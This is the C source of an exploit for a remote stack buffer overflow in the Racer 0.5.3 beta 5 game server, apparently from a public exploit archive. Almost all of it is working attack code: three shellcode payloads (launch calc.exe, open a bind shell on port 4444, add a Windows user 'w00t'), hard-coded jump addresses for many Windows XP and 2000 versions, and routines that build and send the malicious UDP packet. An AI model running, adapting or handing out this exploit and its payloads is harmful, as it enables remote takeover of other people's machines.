/*
Racer vs 0.5.3 beta 5 Remote Stack Buffer Overflow(C) exploit by fl0 fl0w
--------------------------------------------------------------------------------------------------
Description : Bug found some time ago by n00b (Cheers mate ! :D) ,I wanted to make a more
improved sploit , with lots of targets to chose from , and C yes is better :D.
--------------------------------------------------------------------------------------------------
Tested on Win Xp Pro Sp 3  ; Compile DevC++ 4.9.9.2
--------------------------------------------------------------------------------------------------
Command line arguments : -ip ->the ip of your target default is 127.0.0.1                    
                         -port ->default port is 26000                                   
                         -shellcode ->well guess.. :D  
--------------------------------------------------------------------------------------------------                         
What does the exploit do ?                                                           
You can run :Calc.exe, Bind shell on port 4444, Win32 Adduser   
I've set the default port 26000 and ip 127.0.0.1 .      
--------------------------------------------------------------------------------------------------                  
How to use ? Method ?
  -t 10 -ip 127.0.0.1 -port 26000   
  Classic buffer overflow , just jump to the payload and done !
  It can be exploited using SEH method too.
*/





#include <stdio.h>
#include <string.h>
#include <time.h>
#ifdef WIN32
#include "winsock2.h"
#pragma comment(lib, "ws2_32")
#else
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#endif


char packet[2000];


#ifdef WIN32
	WSADATA wsadata;
#endif
  

      
    struct {
                                                     
                                                     const char *name;
                                                     int         size;
                                                     char       *shellcode;     
           }                            set[] = { 
                   {
                       "Run Calc.exe"           , 339 ,
                       "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49"
                       "\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x51\x5a\x37\x6a\x63"
                       "\x58\x30\x42\x30\x50\x42\x6b\x42\x41\x73\x41\x42\x32\x42\x41\x32"
                       "\x41\x41\x30\x41\x41\x58\x38\x42\x42\x50\x75\x38\x69\x69\x6c\x38"
                       "\x68\x41\x54\x77\x70\x57\x70\x75\x50\x6e\x6b\x41\x55\x55\x6c\x6e"
                       "\x6b\x43\x4c\x66\x65\x41\x68\x45\x51\x58\x6f\x4c\x4b\x50\x4f\x62"
                       "\x38\x6e\x6b\x41\x4f\x31\x30\x36\x61\x4a\x4b\x41\x59\x6c\x4b\x74"
                       "\x74\x6e\x6b\x44\x41\x4a\x4e\x47\x41\x4b\x70\x6f\x69\x6c\x6c\x4c"
                       "\x44\x4b\x70\x43\x44\x76\x67\x4b\x71\x4a\x6a\x66\x6d\x66\x61\x39"
                       "\x52\x5a\x4b\x4a\x54\x75\x6b\x62\x74\x56\x44\x73\x34\x41\x65\x4b"
                       "\x55\x4e\x6b\x73\x6f\x54\x64\x53\x31\x6a\x4b\x35\x36\x6c\x4b\x64"
                       "\x4c\x30\x4b\x6c\x4b\x73\x6f\x57\x6c\x75\x51\x6a\x4b\x6c\x4b\x37"
                       "\x6c\x6c\x4b\x77\x71\x68\x6b\x4c\x49\x71\x4c\x51\x34\x43\x34\x6b"
                       "\x73\x46\x51\x79\x50\x71\x74\x4c\x4b\x67\x30\x36\x50\x4c\x45\x4b"
                       "\x70\x62\x58\x74\x4c\x6c\x4b\x53\x70\x56\x6c\x4e\x6b\x34\x30\x47"
                       "\x6c\x4e\x4d\x6c\x4b\x70\x68\x37\x78\x58\x6b\x53\x39\x6c\x4b\x4f"
                       "\x70\x6c\x70\x53\x30\x43\x30\x73\x30\x6c\x4b\x42\x48\x77\x4c\x61"
                       "\x4f\x44\x71\x6b\x46\x73\x50\x72\x76\x6b\x39\x5a\x58\x6f\x73\x4f"
                       "\x30\x73\x4b\x56\x30\x31\x78\x61\x6e\x6a\x78\x4b\x52\x74\x33\x55"
                       "\x38\x4a\x38\x69\x6e\x6c\x4a\x54\x4e\x52\x77\x79\x6f\x79\x77\x42"
                       "\x43\x50\x61\x70\x6c\x41\x73\x64\x6e\x51\x75\x52\x58\x31\x75\x57"
                       "\x70\x63"
                        } ,
             {
                       "Bind shell on port 4444" , 238 ,
                       "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49"
                       "\x49\x48\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x51\x5a\x6a\x67"
                       "\x58\x30\x41\x31\x50\x42\x41\x6b\x42\x41\x77\x32\x42\x42\x42\x32"
                       "\x41\x41\x30\x41\x41\x58\x38\x42\x42\x50\x75\x5a\x49\x49\x6c\x72"
                       "\x4a\x48\x6b\x32\x6d\x48\x68\x4c\x39\x39\x6f\x39\x6f\x69\x6f\x43"
                       "\x50\x6e\x6b\x50\x6c\x66\x44\x41\x34\x4c\x4b\x73\x75\x47\x4c\x6c"
                       "\x4b\x43\x4c\x57\x75\x30\x78\x75\x51\x7a\x4f\x4c\x4b\x42\x6f\x34"
                       "\x58\x4e\x6b\x41\x4f\x37\x50\x46\x61\x7a\x4b\x42\x69\x4e\x6b\x46"
                       "\x54\x6c\x4b\x63\x31\x6a\x4e\x50\x31\x49\x50\x4c\x59\x6e\x4c\x6f"
                       "\x74\x49\x50\x32\x54\x74\x47\x6f\x31\x6b\x7a\x44\x4d\x46\x61\x6f"
                       "\x32\x4a\x4b\x4a\x54\x77\x4b\x31\x44\x51\x34\x55\x78\x31\x65\x4b"
                       "\x55\x6c\x4b\x33\x6f\x75\x74\x63\x31\x38\x6b\x35\x36\x4e\x6b\x44"
                       "\x4c\x70\x4b\x4e\x6b\x43\x6f\x55\x4c\x36\x61\x78\x6b\x36\x63\x66"
                       "\x4c\x4e\x6b\x6f\x79\x42\x4c\x31\x34\x57\x6c\x75\x31\x78\x43\x75"
                       "\x61\x39\x4b\x50\x64\x4c\x4b\x57\x33\x34\x70\x4c\x4b\x77\x30\x64"
                       "\x4c\x4c\x4b\x70\x70\x37\x6c\x4c\x6d\x6e\x6b\x61\x50\x74\x48\x31"
                       "\x4e\x30\x68\x6c\x4e\x62\x6e\x44\x4e\x78\x6c\x72\x70\x39\x6f\x79"
                       "\x46\x63\x56\x76\x33\x70\x66\x42\x48\x56\x53\x37\x42\x53\x58\x62"
                       "\x57\x41\x63\x54\x72\x63\x6f\x51\x44\x59\x6f\x5a\x70\x50\x68\x7a"
                       "\x6b\x6a\x4d\x4b\x4c\x47\x4b\x62\x70\x59\x6f\x6e\x36\x71\x4f\x6f"
                       "\x79\x4d\x35\x43\x56\x6b\x31\x4a\x4d\x33\x38\x34\x42\x31\x45\x52"
                       "\x4a\x55\x52\x79\x6f\x6e\x30\x73\x58\x6a\x79\x77\x79\x4c\x35\x4c"
                       "\x6d\x52\x77\x39\x6f\x69\x46\x72\x73\x71\x43\x61\x43\x41\x43\x30"
                       "\x53\x42\x63\x46\x33\x42\x63\x71\x43\x4b\x4f\x58\x50\x71\x76\x30"
                       "\x68\x32\x31\x71\x4c\x65\x36\x41\x43\x6b\x39\x58\x61\x6a\x35\x63"
                       "\x58\x59\x34\x76\x7a\x30\x70\x4b\x77\x61\x47\x49\x6f\x4a\x76\x71"
                       "\x7a\x42\x30\x53\x61\x41\x45\x6b\x4f\x5a\x70\x53\x58\x6e\x44\x6c"
                       "\x6d\x64\x6e\x6d\x39\x36\x37\x49\x6f\x4b\x66\x73\x63\x30\x55\x39"
                       "\x6f\x4e\x30\x52\x48\x4d\x35\x41\x59\x6f\x76\x32\x69\x70\x57\x49"
                       "\x6f\x4e\x36\x66\x30\x66\x34\x30\x54\x43\x65\x4b\x4f\x4a\x70\x4f"
                       "\x63\x63\x58\x39\x77\x50\x79\x68\x46\x64\x39\x36\x37\x39\x6f\x4e"
                       "\x36\x70\x55\x4b\x4f\x6e\x30\x63\x56\x31\x7a\x32\x44\x42\x46\x31"
                       "\x78\x33\x53\x72\x4d\x4d\x59\x78\x65\x50\x6a\x52\x70\x70\x59\x57"
                       "\x59\x38\x4c\x6b\x39\x5a\x47\x31\x7a\x72\x64\x4e\x69\x4b\x52\x70"
                       "\x31\x49\x50\x78\x73\x4e\x4a\x4b\x4e\x71\x52\x56\x4d\x6b\x4e\x72"
                       "\x62\x34\x6c\x4f\x63\x6e\x6d\x33\x4a\x77\x48\x4e\x4b\x6c\x6b\x4c"
                       "\x6b\x55\x38\x32\x52\x6b\x4e\x58\x33\x56\x76\x59\x6f\x70\x75\x43"
                       "\x74\x49\x6f\x7a\x76\x43\x6b\x36\x37\x70\x52\x36\x31\x31\x41\x31"
                       "\x41\x52\x4a\x54\x41\x70\x51\x51\x41\x50\x55\x63\x61\x6b\x4f\x58"
                       "\x50\x73\x58\x4c\x6d\x79\x49\x43\x35\x4a\x6e\x31\x43\x4b\x4f\x7a"
                       "\x76\x71\x7a\x59\x6f\x4b\x4f\x64\x77\x6b\x4f\x38\x50\x4c\x4b\x50"
                       "\x57\x79\x6c\x4c\x43\x5a\x64\x70\x64\x4b\x4f\x4e\x36\x33\x62\x79"
                       "\x6f\x6e\x30\x41\x78\x4c\x30\x6f\x7a\x43\x34\x51\x4f\x50\x53\x79"
                       "\x6f\x4a\x76\x4b\x4f\x4e\x30\x67"

                        } ,          
                        { 
                       "Win32 Adduser PASS=w00t EXITFUNC=seh USER=w00t" , 238 ,        
                       "\xfc\xbb\xfb\xe2\x33\x0b\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3\x85"
                       "\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x07\x0a\x77\x0b\xf7\xcb\xf3"
                       "\x4e\xcb\x40\x7f\x54\x4b\x56\x6f\xdd\xe4\x40\xe4\xbd\xda\x71\x11"
                       "\x08\x91\x46\x6e\x8a\x4b\x97\xb0\x14\x3f\x5c\xf0\x53\x38\x9c\x3b"
                       "\x96\x47\xdc\x57\x5d\x7c\xb4\x83\x9a\xf7\xd1\x47\xfd\xd3\x18\xb3"
                       "\x64\x90\x17\x08\xe2\xf9\x3b\x8f\x1f\x8e\x58\x04\xde\x7b\xe9\x46"
                       "\xc5\x7f\x29\x47\xc5\x1b\x26\xe8\xf5\x66\xf8\x91\xf9\xe3\xb9\x6d"
                       "\x89\x83\x25\xc3\x06\x0b\x5e\xf0\x10\x40\xde\xb6\x23\x56\xdf\x3d"
                       "\x4b\x6a\x80\x70\x7a\xf2\x68\xfa\x7a\x71\x54\x87\x2a\x1d\xa5\xf2"
                       "\xcf\x82\x2d\x9b\x2e\xb6\xa0\xcc\x31\x21\xdf\x9f\xa9\x83\x45\x18"
                       "\x57\xfb\xaa\xbb\xb7\x95\xd1\x4f\x98\x1c\x69\xd5\xaa\xfe\xfa\x25"
                       "\x7b\x8a\x24\x31\x4b\x42\x51\x9d\x84\xe3\xdd\x99\xfa\xc5\xfb\x01"
                       "\x95\x6c\x70\x62\x05\x01\x1b\x03\xb9\xba\xa9\xac\x34\x34\x6e\x72"
                       "\xd3\xd9\x07\x1a\x72\x52\xac\x90\xe5\xe0\x23\x27\x95\x28\xcb\xf7"
                       "\x69\x5c\x13\xd7\xc8\xd8\x17\x27\xcb\xe0\x97\x27\xcb"
                       },
                               {NULL, NULL}
                  };
                  
#define EIP1 "\x7B\x46\x86\x7C"  //Microsoft Windows Xp Pro sp3 JMP ESP Kernel32.dll
#define EIP2 "\x41\x41\x41\x41" //Test Crash
#define EIP3 "\xD9\x13\x00\x01" //Microsoft Win XP-Universal 1
#define NVal -1    
#define EIP4 "\x74\x16\xE8\x77"  //Microsoft Windows 2000 SP0 English
#define EIP5 "\xEC\x29\xE8\x77"  //Microsoft Windows XP SP1   English 
#define EIP6 "\xB5\x24\xE8\x77" //Microsoft Windows 2000 SP2 English 
#define EIP7 "\x7A\x36\xE8\x77" //Microsoft Windows 2000 SP3 English
#define EIP8 "\x9B\x2A\xF9\x77"  //Microsoft Windows 2000 SP4 English
#define EIP9 "\xE3\xAF\xE9\x77" //Microsoft Windows XP SP0   English 
#define EIP10 "\xBA\x26\xE6\x77" //Microsoft Win XP-Universal 2

   
   void Disconnect (SOCKET); 
   void Wait_s (int);         
   void Usage (char *);
   void Exit (int);
   int wsg (char *, char *);
   void Help ();   
        
 int main (int argc, char *argv[])

{
    if (argc < 6) { 
       Help ();
       Exit (0);
       }
	int sskd, 
        sw=0;
	char *target, 
         *os;
    system ("CLS");     
    Help ();
    
	if (WSAStartup (MAKEWORD(2,0), &wsadata) != 0) {
          printf("wsastartup error\n");
          NVal -1;
          }
     
	int     ip = htonl(inet_addr(argv[4])); 
    int   port = atoi (argv[6]);
    int  defaultPort = 26000;  
    char *defaultIp = "127.0.0.1";
 //test ip ; If you enter 0 default will be set       
    if (atoi (argv[4]) <= 0) 
       ip = htonl(inet_addr(defaultIp));   
   //test if port is valid ; If you enter 0 the default will be loaded    
    if ( atoi (argv[6]) <= 0 || atoi (argv[6]) > 65000)  
                    port = defaultPort;
  //test line arguments              
    if (wsg (argv[1], "-t") == NVal) {
       Usage (argv[0]);
         Exit (0);
       }
    if (wsg (argv[3], "-ip") == NVal) {
    Usage (argv[0]);
    Exit (0);
   }
    if (wsg (argv[5], "-port") == NVal) {
    Usage (argv[0]);
     Exit (0);
}    
       if (wsg (argv[7], "-shellcode") == NVal) {
    Usage (argv[0]);
     Exit (0);
}    
   //endtest  
     char *g;

	SOCKET s;
    fd_set mask;
    struct timeval timeout; 
    struct sockaddr_in server;
	s=socket(AF_INET,SOCK_DGRAM,0);
	if (s == -1) {
          perror ("Socket\n");
                           return NVal;
          }	
    //selecting JMP address      
	if (atoi (argv[2]) == 1) {
                      g       = EIP1;
                      os      = "win xp pro sp 3 English";
                      }
        else                
	if (atoi (argv[2]) == 2) {
                                  g  = EIP2;
                                  os = "boom";
                              }
     else                               
    	if (atoi (argv[2]) == 3) {
                      g       = EIP3;
                      os      = "win xp pro sp 3 English";
                      }
         else             
	if (atoi (argv[2]) == 4) {
                                  g  = EIP4;
                                  os = "boom";
                              } 
             else                  
    	if (atoi (argv[2]) == 5) {
                      g       = EIP5;
                      os      = "win xp pro sp 3 English";
                      }
          else            
	if (atoi (argv[2]) == 6) {
                                  g  = EIP6;
                                  os = "boom";
                              }   
            else                              
    	if (atoi (argv[2]) == 7) {
                      g       = EIP7;
                      os      = "win xp pro sp 3 English";
                      }
          else            
	if (atoi (argv[2]) == 8) {
                                  g  = EIP8;
                                  os = "boom";
                              } 
        else                                 
    	if (atoi (argv[2]) == 9) {
                      g       = EIP9;
                      os      = "win xp pro sp 3 English";
                      }
        else              
	if (atoi (argv[2]) == 10) {
                                  g  = EIP10;
                                  os = "boom";
                              }
  //endselect                              
    system ("cls");
    printf ("--------------------------\n");                                                                                                                                                                         
    printf ("*Preparing connection...\n");   
    Wait_s (500);      
	server.sin_family=AF_INET;
	server.sin_addr.s_addr=htonl(ip);
	server.sin_port=htons(port);
 //core of exploit	
	int i;
	do {
       packet[i] = 'E';
                  i++; 
        }while (i < 2000);
        
    printf ("*Building buffer...\n");    
    Wait_s (500);
	memset (packet,0x90,2000);
    memcpy (packet + 1001, g, 4);
    
    if (atoi (argv[8]) == 0) 
    memcpy (packet + 1005 , (char*)set[0].shellcode, strlen ((char*)set[0].shellcode));
      else
    if (atoi (argv[8]) == 1) 
    memcpy (packet + 1005 , (char*)set[1].shellcode, strlen ((char*)set[1].shellcode));
      else
    if (atoi (argv[8]) == 2) 
    memcpy (packet + 1005 , (char*)set[2].shellcode, strlen ((char*)set[2].shellcode));
    printf ("*Sending packets...\n");   
    Wait_s (500); 
    
	sskd = sendto(s, packet, sizeof (packet), 0, (struct sockaddr *)&server, sizeof (server));
//endcore
	timeout.tv_sec=10;timeout.tv_usec=0;FD_ZERO(&mask);FD_SET(s,&mask);
	sw = select((s+1),&mask,NULL,NULL,&timeout);
	if(sw)
	{
		perror ("Server \n");
		Disconnect (s);
		return -1;
	}
	else
	{   printf ("*you can get shell now ! if calc isn't launched already ...:))\n");
        printf ("*Success !\n"); 
        printf ("-------------------------\n");
        Help ();
     	Disconnect (s);	
		return 0;
	}
	return 0;
}

int wsg (char *name1, char *name2)
  {
            if (strcmp (name1, name2) == 0) 
               return 1;
                      return NVal; 
      }
      
 void Usage (char *name)
 {
     printf ("Usage is: %s -t 1->4 -ip 127.0.0.1 -port 26000\n", name);
          }
  void Help ()
  {
    fputs (
           "**********    **********************************    **************  **********\n" 
           "::::Racer vs 0.5.3 Remote Stack Buffer Overflow Exploit (C)::::   \n"
           "::::                    By fl0 fl0w                        ::::  \n"
           "\t-t ->target->                                                   "
           "                                                                  \n"
           "\t\tMicrosoft Win XP-Universal                                    \n"
           "\t\tMicrosoft Windows XP SP0   English                            \n"
           "\t\tMicrosoft Windows XP SP1   English                            \n"
           "\t\tMicrosoft Win XP Pro sp3 English                              \n"
           "\t\tMicrosoft Windows 2000 SP0 English                            \n"
           "\t\tMicrosoft Windows 2000 SP1 English                            \n"
           "\t\tMicrosoft Windows 2000 SP2 English                            \n"
           "\t\tMicrosoft Windows 2000 SP3 English                            \n"
           "\t\tMicrosoft Windows 2000 SP4 English                            \n"
           "                                                                  \n"
           "\t-ip ->the ip of your target default is 127.0.0.1                \n"     
           "                                                                  \n"   
           "\t-port ->default port is 26000                                   \n"
           "                                                                  \n"
           "\t-shellcode ->well guess.. :D                                    \n"
           "\t\t {1}Run Calc.exe                                              \n"
           "\t\t {2}Bind shell on port 4444                                   \n"
           "\t\t {3}Win32 Adduser PASS=w00t EXITFUNC=seh USER=w00t            \n"
           "\n"
           "EXAMPLE"
           "  Usage is:  -t 10 -ip 127.0.0.1 -port 26000                       "      
    ,stdout);   
       }         
  void Exit (int t)
  {
     exit (t); 
      }  
 void Wait_s (int seconds)
 {
    Sleep (seconds);  
      }
  
  void Disconnect (SOCKET S)
  {
   closesocket(S);    
       }  
